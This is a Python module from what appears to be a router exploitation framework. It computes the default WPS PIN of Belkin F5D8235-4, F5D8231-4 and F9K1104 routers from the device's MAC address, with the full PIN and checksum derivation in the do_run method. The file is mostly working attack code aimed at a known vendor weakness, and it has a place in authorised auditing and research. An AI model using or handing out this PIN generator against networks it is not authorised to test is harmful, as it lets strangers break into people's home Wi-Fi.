# Name:Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 mac2wps
# File:mac2wps.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 19.7.2015
# Last modified: 19.7.2015
# Shodan Dork:
# Description: Generates WPS key for Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 based on mac.
# Based on work of ZhaoChunsheng and e.novellalorente@student.ru.nl (http://ednolo.alumnos.upv.es/?p=1295)

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 mac2wps
File:mac2wps.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 19.7.2015
Description: Generates WPS key for Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 based on mac.
Based on: Work of ZhaoChunsheng and e.novellalorente@student.ru.nl (http://ednolo.alumnos.upv.es/?p=1295)

Options:
    Name        Description

    mac         MAC address used as input for WPS pin generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")
        mac = mac[6:]

        p = int(mac, 16) % 10000000
        pin = p
        accum = 0
        while pin:
            accum += int(3 * (pin % 10))
            pin = int(pin / 10)
            accum += int(pin % 10)
            pin = int(pin / 10)
        key = (10 - accum % 10) % 10
        key = format("%07d%d" % (p, key))

        print_success("WPS pin generated")
        print("WPS pin:" + key)


Misc()
